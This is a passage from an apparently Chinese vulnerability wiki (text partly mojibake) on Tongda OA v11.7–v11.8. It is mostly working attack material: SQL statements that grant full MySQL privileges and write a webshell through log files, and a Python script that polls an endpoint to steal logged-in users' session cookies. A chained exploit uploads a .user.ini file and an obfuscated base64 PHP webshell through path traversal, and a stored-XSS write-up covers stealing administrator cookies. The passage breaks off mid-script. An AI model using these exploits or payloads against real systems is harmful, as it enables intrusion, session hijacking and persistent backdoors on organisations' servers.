ËæìÂÖ•ÂØÜÁ†ÅÊü•ËØ¢ÊâÄÊúâÁî®Êà∑ ÂèëÁé∞ÊàêÂäüÊâßË°åÊ∑ªÂä†‰∏Ä‰∏™Ë¥¶Êà∑ ÁÑ∂ÂêéËØ•Áî®Êà∑ÊòØÂØπmysqlÊï∞ÊçÆÂ∫ìÊã•ÊúâÊâÄÊúâÊùÉÈôêÁöÑ,ÁÑ∂ÂêéÁªôËá™Â∑±Âä†ÊùÉÈôêÔºö UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5)); ÁÑ∂ÂêéÁî®Ê≥®ÂÖ•ÁÇπÂà∑Êñ∞ÊùÉÈôêÔºåÂõ†‰∏∫ËØ•Áî®Êà∑ÊòØÊ≤°ÊúâÂà∑Êñ∞ÊùÉÈôêÁöÑÊùÉÈôêÁöÑÔºögeneral/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;ËøôÊ†∑Â∞±Êã•Êúâ‰∫ÜÊâÄÊúâÊùÉÈôê ÁôªÂΩïÂ¶ÇÊûúÂ§±Ë¥•ÔºåÊâßË°å grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION Âà©Áî®ÊºèÊ¥ûÂÜôshell # Êü•Ë∑ØÂæÑÔºö select @@basedir; # F:\\OA\\mysql5\\ÔºåÈÇ£‰πàwebÁõÆÂΩïÂ∞±ÊòØ F:/OA/webroot/ # ÊñπÊ≥ï1Ôºö set global slow_query_log=on; set global slow_query_log_file='F:/OA/webroot/'; select '' or sleep(11); # ÊñπÊ≥ï2Ôºö set global general_log = on; set global general_log_file = 'F:/OA/webroot/'; select ''; show variables like '%general%'; ‰∏ä‰º†Â§ßÈ©¨ ÂèÇËÄÉÊñáÁ´† ÈÄöËææOA v11.7ÂêéÂè∞SQLÊ≥®ÂÖ•Âà∞RCE[0day] Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.7 Âú®Á∫øÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.7 Âú®Á∫øÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html","title":"ÈÄöËææOA v11.7 Âú®Á∫øÁî®Êà∑ÁôªÂΩïÊºèÊ¥û","keywords":"","body":"ÈÄöËææOA v11.7 Âú®Á∫øÁî®Êà∑ÁôªÂΩïÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈÄöËææOA v11.7 ‰∏≠Â≠òÂú®ÊüêÊé•Âè£Êü•ËØ¢Âú®Á∫øÁî®Êà∑ÔºåÂΩìÁî®Êà∑Âú®Á∫øÊó∂‰ºöËøîÂõû PHPSESSION‰ΩøÂÖ∂ÂèØÁôªÂΩïÂêéÂè∞Á≥ªÁªü ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈÄöËææOA ÁéØÂ¢ÉÊê≠Âª∫ ÈÄöËææOA v11.7‰∏ãËΩΩÈìæÊé• ‰∏ãËΩΩÂêéÊåâÊ≠•È™§ÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÊúâÂÖ≥Êñá‰ª∂ MYOA\\webroot\\mobile\\auth_mobi.php Âú®ÊâßË°åÁöÑ SQLËØ≠Âè•‰∏≠ $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\''; ÁÆÄÂçïÈòÖËØªPHPÊ∫êÁ†ÅÂèØ‰ª•Áü•ÈÅì Ê≠§SQLËØ≠Âè•‰ºöÊü•ËØ¢Áî®Êà∑ÊòØÂê¶Âú®Á∫øÔºåÂ¶ÇÂú®Á∫øËøîÂõûÊ≠§Áî®Êà∑ Session ID Â∞ÜËøîÂõûÁöÑ Set-Cookie ‰∏≠ÁöÑCookieÂèÇÊï∞ÂÄº‰ΩøÁî®‰∫éÁôªÂΩïCookie ËÆøÈóÆÁõÆÊ†áÂêéÂè∞ http://xxx.xxx.xxx.xxx/general/ ÂΩìÁõÆÊ†áÁ¶ªÁ∫øÊó∂ÂàôËÆøÈóÆÊºèÊ¥ûÈ°µÈù¢Âàô‰ºöÂá∫Áé∞Â¶Ç‰∏ãÂõæ [!NOTE] ÈÄöËøáÊ≠§ÊÄùË∑ØÂèØ‰ª•ÊåÅÁª≠ÂèëÂåÖÁõëÊéßÊ≠§È°µÈù¢Êù•Ëé∑ÂèñÂú®Á∫øÁî®Êà∑ÁöÑCookie ÊºèÊ¥ûÂà©Áî®POC [!NOTE] 5Áßí‰∏ÄÊ¨°ÊµãËØïÁî®Êà∑ÊòØÂê¶Âú®Á∫ø import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÈÄöËææOA 11.7 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] ÁõÆÊ†áÁî®Êà∑‰∏∫‰∏ãÁ∫øÁä∂ÊÄÅ --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] Áî®Êà∑‰∏äÁ∫ø PHPSESSION: {} --- {}\\033[0m\".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time())))) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•ÔºåÁõÆÊ†áÂèØËÉΩ‰∏çÂ≠òÂú®ÊºèÊ¥û\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_1(target_url) time.sleep(5) [!NOTE] ‰∫é 2021-3-11 Ê∑ªÂä†Ëøõ‰∏ÄÊ≠•Âà©Áî®POC ÈÖçÂêà import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: ÈÄöËææOA 11.7 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_0(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] ÁõÆÊ†áÁî®Êà∑‰∏∫‰∏ãÁ∫øÁä∂ÊÄÅ --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": Cookie = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] Áî®Êà∑‰∏äÁ∫ø PHPSESSION: {} --- {}\\033[0m\".format(Cookie[0] ,time.asctime(time.localtime(time.time())))) Cookie = \"PHPSESSID={};USER_NAME_COOKIE=admin; OA_USER_ID=admin\".format(Cookie[0]) POC_1(target_url, Cookie) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•ÔºåÁõÆÊ†áÂèØËÉΩ‰∏çÂ≠òÂú®ÊºèÊ¥û\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5pbmkiCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKYXV0b19wcmVwZW5kX2ZpbGU9dGVzdC5sb2cKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º†.user.iniÊñá‰ª∂, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º†.user.iniÊñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5sb2ciCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKPD9waHAgCmVjaG8gInRlc3RfV2lraSI7CiRwemtCPWNyZWF0ZV9mdW5jdGlvbihjaHIoMDEwMTc1MC8wMTY1MikuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoOTkwODEvOTA5KS5jaHIoMDEwMjUtMDY2MCksY2hyKDA1MTctMDM1MikuY2hyKDB4MzQzLTB4MmNkKS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuYmFzZTY0X2RlY29kZSgnS0E9PScpLmJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoNDQ0LTMyOSkuYmFzZTY0X2RlY29kZSgnYnc9PScpLmNocig1OTctNDg4KS5jaHIoMHgxOWYtMHgxM2EpLmNocigyMTktMTc4KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRwemtCKGJhc2U2NF9kZWNvZGUoJ05EZzFOJy4nemMyTzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODIxMTAvOTY2KS5iYXNlNjRfZGVjb2RlKCdSUT09Jykuc3RyX3JvdDEzKCc5JykuY2hyKDAxNTUwNjQvMDEyMzEpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5zdHJfcm90MTMoJ1MnKS5iYXNlNjRfZGVjb2RlKCdkQT09JykuYmFzZTY0X2RlY29kZSgnTUE9PScpLmNocig2MDc1MC82NzUpLmNocigwMTUwNy0wMTM1NykuJycuJ04wWFNrJy4nN01UUTEnLidOek15TycuJ0RzPScuJycpKTs/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQo=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"Ê°£Ê°àÂ∑≤‰øùÂ≠ò\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÊàêÂäü‰∏ä‰º† test.log Êñá‰ª∂, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏ä‰º† test.log Êñá‰ª∂Â§±Ë¥•\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠ÂåÖÂê´ test_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÊàêÂäü‰∏ä‰º†ËöÅÂâëÊú®È©¨ ÂØÜÁ†Å‰∏∫: test \\n[o] webshellË∑ØÂæÑ: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) sys.exit(0) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏≠‰∏çÂåÖÂê´ test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_0(target_url) time.sleep(5) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´XSSÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ÈÄöËææOA/ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´XSSÊºèÊ¥û.html","title":"ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´XSSÊºèÊ¥û","keywords":"","body":"ÈÄöËææOA v11.8 ÂêéÂè∞Êñá‰ª∂ÂåÖÂê´Â≠òÂÇ®ÂûãXSSÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÈÄöËææOA v11.8‰ª•‰∏ãÂ≠òÂú®Êñá‰ª∂‰∏ä‰º†Êé•Âè£ÔºåÂèØ‰∏ä‰º† .user.ini Êñá‰ª∂ÂåÖÂê´ÊúâxssËØ≠Âè•ÁöÑÊñá‰ª∂Ôºå‰ΩøÁÆ°ÁêÜÂëòÂêéÂè∞Êñá‰ª∂ÂùáÂåÖÂê´XSSËØ≠Âè•ÔºåË¢´ÊîªÂáªËÄÖËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈÄöËææOA ÁéØÂ¢ÉÊê≠Âª∫ ÈÄöËææOA v11.6‰∏ãËΩΩÈìæÊé• ‰∏ãËΩΩÂÆåÊØïÁÇπÂáªÂÆâË£ÖÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ËøôÈáå‰ΩøÁî®ÁöÑÁéØÂ¢É‰∏∫ÈÄöËææ v11.6ÁâàÊú¨Ôºåv11.6ÁâàÊú¨‰∏≠ÁöÑÊºèÊ¥ûÂà©Áî®ËæÉÂ•ΩÔºåÂú® v11.7 ÂêéÁª≠ÁâàÊú¨‰∏≠ËßÑÂÆö‰∫Ü‰∏ä‰º†Ë∑ØÂæÑÔºåÂØºËá¥XSSÂà©Áî®‰ºöÊØîËæÉÂõ∞Èöæ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"ÈôÑ‰ª∂‰∏ä‰º†Â§±Ë¥•\"), _(\"ÂéüÂõ†ÔºöÈôÑ‰ª∂Êñá‰ª∂‰∏∫Á©∫ÊàñÊñá‰ª∂ÂêçÂ§™ÈïøÔºåÊàñÈôÑ‰ª∂Â§ß‰∫é30ÂÖÜÂ≠óËäÇÔºåÊàñÊñá‰ª∂Ë∑ØÂæÑ‰∏çÂ≠òÂú®ÔºÅ\")); Button_Back(); exit(); } } Âú®ËøôÈáåÂèÇÊï∞ $USER_ID ÊòØÂèØÊéßÁöÑÔºåÂπ∂‰∏îÊó†ËøáÊª§Âç±Èô©Á¨¶Âè∑Â∞±ÊãºÊé•ËøõÂéª‰∫ÜÔºåÈÇ£Êàë‰ª¨‰º†ÂÖ• ../../../ Êàë‰ª¨Â∞±ÂèØ‰ª•‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†‰∫Ü Áî±‰∫éÈÄöËææOA ÁöÑÊñá‰ª∂‰∏ä‰º†ÈôêÂà∂ÁöÑÊ≠ªÊ≠ªÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂà©Áî® PHPÁöÑ .user.ini Êñá‰ª∂Êù•ÂåÖÂê´ÂÖ∂‰ªñÊñá‰ª∂ÔºåËøôÈáåÊòØÂèØ‰ª•Áî®‰∫éÂåÖÂê´XSSËØ≠Âè•ÁöÑÊñá‰ª∂ÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨‰∏ä‰º†Êñá‰ª∂ ÂÜÖÂÆπ‰∏∫ auto_prepend_file=peiqi.log Êàë‰ª¨ÊÉ≥Ë¶ÅÊúÄÂ§ßÂåñÂà©Áî®ÂèØ‰ª•‰∏ä‰º†Âú®È¶ñÈ°µÊàñËÄÖÁÆ°ÁêÜÂëò ÁïåÈù¢ÔºåÂà©Áî®Ëá™ÂÆö‰πâÂºπÁ™óÊù•Ê∏óÈÄè ËøôÈáåÂØπÁÆ°ÁêÜÂëòÈ°µÈù¢ general ÁõÆÂΩï‰∏ä‰º† ËØ∑Ê±ÇÂåÖ‰∏∫ POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" Êèê‰∫§ -----------------------------17518323986548992951984057104-- ÂÖ∂‰∏≠ USER_ID=../../general/.user ‰∏∫‰∏ä‰º†Ë∑ØÂæÑ Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log ËøôÈáåÊãºÊé•Âêé‰∏ä‰º†Â∞±ÂèòÊàê‰∫Ü .user.ini ËøôÈáåÂÜç‰∏ä‰º† XSSÊñá‰ª∂ peiqi.log Ë¢´ÂåÖÂê´ËøõÂéª ‰∏ä‰º†ÂêéÊØèÊ¨°ÁÆ°ÁêÜÂëòÁôªÂΩïÂêéÈÉΩ‰ºöÂ∏¶ÁùÄCookieËØ∑Ê±Ç‰∏ÄÊ¨°XSSÂπ≥Âè∞ ÈíìÈ±º‰ªÄ‰πàÁöÑ‰ª£Á†ÅÂÜôÂú®peiqi.logÊñá‰ª∂ÈáåÂ∞±Â•ΩÂï¶ ÂàöÂàöÊèêÂà∞‰∫Ü v11.7ÁâàÊú¨‰∏çÊñπ‰æøÂà©Áî®ÔºåËøôÊòØÂõ†‰∏∫Âú®ÂêéÁª≠ÁâàÊú¨Âä†‰∏ä‰∫ÜÊñá‰ª∂‰∏ä‰º†ÁöÑËßÑÂÆöË∑ØÂæÑ if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } Ë∑ØÂæÑ‰∏≠ÂøÖÈ°ªË¶ÅÂåÖÂê´ webroot Âíå attachment ÊâçÂèØ‰ª•‰∏ä‰º† ËøôÈáåXSSÁöÑÂà©Áî®ÁÇπÊúâ4‰∏™Êñá‰ª∂Â§πÔºåÂÖ∂‰∏≠ÊúÄÊúâÂá†ÁéáXSSÁöÑ‰∏∫Â≠òÂÇ®ÁõÆÂΩïÁÆ°ÁêÜÁöÑÊñá‰ª∂Â§π Áî®ÂêåÊ†∑ÁöÑÊñπÊ≥ï‰∏ä‰º†Âà©Áî®Êñá‰ª∂ÔºåÊØèÊ¨°ÂΩìÁÆ°ÁêÜÂëòËÆæÁΩÆÊó∂Â∞±‰ºöÁõóÂèñCookie ÊºèÊ¥ûÂà©Áî®POC Âõ†‰∏∫ÊòØxssÂèØËÉΩÂØπÁõÆÊ†áÊúâÂΩ±ÂìçÔºåÊâÄ‰ª•ËøôÈáåPOCÂú®‰∏Ä‰∏™‰∏çÂ∏∏Áî®ÁõÆÂΩïÊé¢ÊµãÊòØÂê¶Â≠òÂú®ÊºèÊ¥û CookieÂ°´ÂÜôËÆøÈóÆÂêéÂè∞Êó∂ÁöÑCookie, ÂÖ∂‰∏≠ÁöÑbase64Ëß£Á†ÅÊõ¥Êîπ PeiQi_Wiki‰∏∫ Ëá™Â∑±ÁöÑXSSËØ≠Âè• v11.6Âèä‰ª•‰∏ã ÊîªÂáª /general Âíå /general/system/attachment ÁõÆÂΩïËæÉÂ•Ω v11.6‰ª•‰∏ä ÊîªÂáª /general/system/attachment ÁõÆÂΩïËæÉÂ•Ω import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: ÈÄöËææOA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = 